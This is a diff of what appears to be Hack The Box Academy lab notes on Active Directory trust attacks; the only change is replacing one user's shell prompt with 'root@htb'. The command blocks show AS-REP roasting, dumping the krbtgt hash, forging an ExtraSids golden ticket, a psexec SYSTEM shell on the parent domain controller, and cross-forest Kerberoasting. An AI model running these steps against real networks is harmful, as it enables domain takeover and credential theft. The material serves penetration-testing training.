+root@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
 [-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -10146,7 +10146,7 @@ Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCA
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+root@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -10168,7 +10168,7 @@ Next, we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+root@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -10208,7 +10208,7 @@ We can filter out the noise by piping the command output to grep and looking for
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+root@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
 
 Password:
 
@@ -10222,7 +10222,7 @@ Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (D
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+root@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
 
 Password:
 [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
@@ -10255,7 +10255,7 @@ Next, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/m
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+root@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -10280,7 +10280,7 @@ The ticket will be saved down to our system as a [credential cache (ccache)](htt
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
+root@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
 ```
 
 We can check if we can successfully authenticate to the parent domain's Domain Controller using [Impacket's version of Psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.
@@ -10290,7 +10290,7 @@ We can check if we can successfully authenticate to the parent domain's Domain C
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+root@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -10326,7 +10326,7 @@ Finally, if the `target-exec` switch is specified, it authenticates to the paren
 &#x20; Attacking Domain Trusts - Child -> Parent Trusts - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+root@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -10574,7 +10574,7 @@ As we saw in the previous section, it is often possible to Kerberoast across a f
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+root@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -10591,7 +10591,7 @@ Rerunning the command with the `-request` flag added gives us the TGS ticket. We
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+root@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -10621,7 +10621,7 @@ On some assessments, our client may provision a VM for us that gets an IP from D
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/resolv.conf 
+root@htb[/htb]$ cat /etc/resolv.conf 
 
 # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
 #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
@@ -10641,7 +10641,7 @@ Once this is in place, we can run the tool against the target domain as follows:
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+root@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
 
 INFO: Found AD domain: inlanefreight.local
 INFO: Connecting to LDAP server: ACADEMY-EA-DC01
@@ -10664,7 +10664,7 @@ We can compress the resultant zip files to upload one single zip file directly i
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ zip -r ilfreight_bh.zip *.json
+root@htb[/htb]$ zip -r ilfreight_bh.zip *.json
 
   adding: 20220329140127_computers.json (deflated 99%)
   adding: 20220329140127_domains.json (deflated 82%)
@@ -10679,7 +10679,7 @@ We will repeat the same process, this time filling in the details for the `FREIG
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/resolv.conf 
+root@htb[/htb]$ cat /etc/resolv.conf 
 
 # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
 #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
@@ -10699,7 +10699,7 @@ The `bloodhound-python` command will look similar to the previous one:
 &#x20; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+root@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
 
 INFO: Found AD domain: freightlogistics.local
 INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
